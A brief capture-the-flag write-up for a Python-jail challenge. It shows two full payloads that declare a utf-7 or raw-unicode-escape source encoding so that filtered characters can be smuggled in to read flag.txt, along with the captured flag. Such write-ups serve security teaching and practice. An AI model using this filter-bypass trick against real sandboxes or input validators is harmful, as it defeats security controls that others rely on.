# just read the flag [1000 points] (1 solves) (Post-Match Solve)
### utf-8
The magic in this challenge is use comment to specify `utf-7` encoding, allowing us to encode restricted characters using allowed sequences. Then, encode restricted characters like `(`, `)`, `"`, `.` using UTF-7 sequences: 
```
ACg -> (
ACk -> )
ACI -> "
AC4 -> .
```
Full payload:
```bash
Just read the flag.txt! Very simple!
> # -*- coding: utf-7 -*-
> print+ACg-open+ACg-+ACI-flag+AC4-txt+ACI-+ACk-+AC4-read+ACg-+ACk-+ACk-
> 
firebird{v3ry_51mpl3_70_r34d_7h3_fl46,_r16h7?}
```
---
### raw‑unicode‑escape codec
Another similar way to solve this challenge would be use Python's `raw‑unicode‑escape codec`:
```
\u0028 -> (
\u0029 -> )
\u0022 -> "
\u002E -> .
```
Full payload:
```bash
Just read the flag.txt! Very simple!
> # -*- coding: raw-unicode-escape -*-
> print\u0028open\u0028\u0022flag\u002Etxt\u0022\u0029\u002Eread\u0028\u0029\u0029
>
firebird{v3ry_51mpl3_70_r34d_7h3_fl46,_r16h7?}
```